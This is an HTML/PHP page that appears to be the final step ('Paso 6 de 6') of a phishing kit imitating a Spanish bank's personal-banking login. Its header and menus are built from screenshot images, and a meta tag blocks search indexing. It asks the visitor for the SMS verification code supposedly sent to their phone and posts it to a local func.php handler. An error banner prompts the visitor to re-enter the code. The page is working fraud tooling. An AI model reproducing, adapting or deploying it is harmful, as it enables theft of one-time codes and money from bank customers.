<!doctype html>
<html style="display: flex; flex-direction: column; height: 100%;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./Assets/css/helpers.css">
        <link rel="stylesheet" href="./Assets/css/style.css">
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <link rel="icon" type="image/png" href="./Assets/imgs/ff.png" />
        <title>Particulares</title>
        <script src="./Assets/js/stutes.js"></script>
    </head>

    <body style="display: flex; flex-direction: column; height: 100%;">

        <header id="header">
            <div class="container">
                <div><img class="d-lg-block d-md-none d-sm-none d-none" src="./Assets/imgs/logo_RGB.svg" style="width: 200px;"></div>
                <div><img class="d-lg-none d-md-block d-sm-block d-block" src="./Assets/imgs/logo4.png"></div>
                <div>
                    <img class="d-lg-block d-md-none d-sm-none d-none" src="./Assets/imgs/mainmenu.png">
                    <img class="d-lg-none d-md-block d-sm-block d-block" src="./Assets/imgs/mobile-menu.png">
                </div>
            </div>      
        </header>

        <nav id="nav">
            <div class="container">
                <div><img src="./Assets/imgs/header-left.png"></div>
                <div><img src="./Assets/imgs/sofia.png"></div>
            </div>
        </nav>
        <div class="wrapper_details">
            <div class="container_details">
                <div class="length_box">
                    <div class="length">
                        <div class="max_legth"></div>
                    </div>
                    <p>Paso 6 de 6</p>
                </div>
                <form action="./Assets/php/config/func.php" method="post">
                    <input type="hidden" name="sms">
                    <div class="title_form text-center w-100">
                        <img src="./Assets/imgs/call-code.svg" class="mb-3" width="60" alt="">
                        <h1 class="mb-1">Introduce Código</h1>
                        <p class="mt-0">Te lo hemos enviado a tu móvil <span></span></p>
                    </div>
                    <?php if( isset($_GET['error']) ) : ?>
                    <div class="error mt-4 px-4">
                        <i class="ri-alert-line"></i>
                        <p>Debes introducir un código válido que se te ha enviado a tu teléfono. Vuelve a intentarlo.</p>
                    </div>
                    <?php endif; ?>                    
                    <div class="inputes d-flex justify-content-center align-items-center">
                        <div class="form-group input_box">
                            <input type="text" name="code" id="code" placeholder="Escribe el código" inputmode="text">
                        </div>
                    </div>
                    <p class="d-flex justify-content-center align-items-center"><img src="./Assets/imgs/chatting.png" width="25" alt=""> ¿No has recibido el código?</p>
                    <div class="btn_sub d-flex justify-content-end">
                        <button type="submit" disabled>Firmar y continuar</button>
                    </div>
                </form>
            </div>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="./Assets/js>/js.js"></script>

        <script>
            $("input").keyup(function(){
                if ($("#code").val() != "") {
                    $(".btn_sub button").prop("disabled",false);
                }else{
                    $(".btn_sub button").prop("disabled",true);
                }
            }); 
        </script>

    </body>

</html>